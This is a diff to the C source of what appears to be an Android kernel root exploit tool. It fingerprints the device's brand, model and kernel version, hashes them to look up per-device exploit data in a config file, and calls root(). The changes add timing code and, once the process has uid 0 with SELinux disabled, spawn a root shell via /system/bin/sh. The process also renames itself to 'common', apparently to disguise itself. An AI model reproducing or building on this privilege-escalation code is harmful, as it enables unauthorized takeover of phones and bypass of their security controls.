@@ -12,6 +12,7 @@
 #include <linux/kernel.h>
 #include <net/if.h>
 #include <fcntl.h>
+#include <sys/time.h>
 #include "becomeroot.h"
 #include "ksyms_search.h"
 #include "sha256.h"
@@ -163,7 +164,7 @@ void get_phone_props(char res[], int size){
 	
 	snprintf(res, size, "%s|%s|%s", brand, model, linux_version);
 }
-
+void trans_str(char* data);
 struct phone_fit_data* get_fit_data(){
 	SHA256_CTX ctx;
 	char phone_data[2048];
@@ -176,6 +177,7 @@ struct phone_fit_data* get_fit_data(){
 	//strcpy(phone_data, "ZTE|ZTE A2015|Linux version 3.10.49-perf-ga5b53b6 (zte@scl_xa243_222) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #2 SMP PREEMPT Thu Sep 24 12:45:18 CST 2015");
 	
 	get_phone_props(phone_data, sizeof(phone_data));
+	//trans_str(phone_data);
 	printf("[++] <get_fit_data> phone_data=%s\n", phone_data);
 	
 	memset(hash, 0, sizeof(hash));
@@ -192,6 +194,7 @@ struct phone_fit_data* get_fit_data(){
 		while( 0x58 == read(fd, &fit_data, sizeof(fit_data)) ){
 			if( 0 == memcmp(hash, &fit_data, sizeof(hash)) ){
 				close(fd);
+				
 				return &fit_data;
 			}
 		}
@@ -426,15 +429,26 @@ int root(){
 }
 
 int main(int argc, char* argv[]){
+	struct timeval tv_begin, tv_end;
+	
 	if( argc < 2){
 		printf("Usage : %s <config file path>\n", argv[0]);
 		return;
 	}
 	strncpy(filename, argv[1], sizeof(filename));
+	
+	gettimeofday(&tv_begin, NULL); 
 	root();
+	gettimeofday(&tv_end, NULL);
+	
 	if( -1 == prctl(PR_SET_NAME, "common") ){
 		printf("[-] <root> failed to prctl\n");
 		return;
+	}
+	printf("spend time : %ld millisecond!!\n", (tv_end.tv_sec-tv_begin.tv_sec) * 1000 +  (tv_end.tv_usec-tv_begin.tv_usec)/1000);
+	if( 0 == getuid() && 0 == root_get_selinux_status()){
+		printf("root success !!\n");
+		system("/system/bin/sh");
 	}
 	return 0;
 }
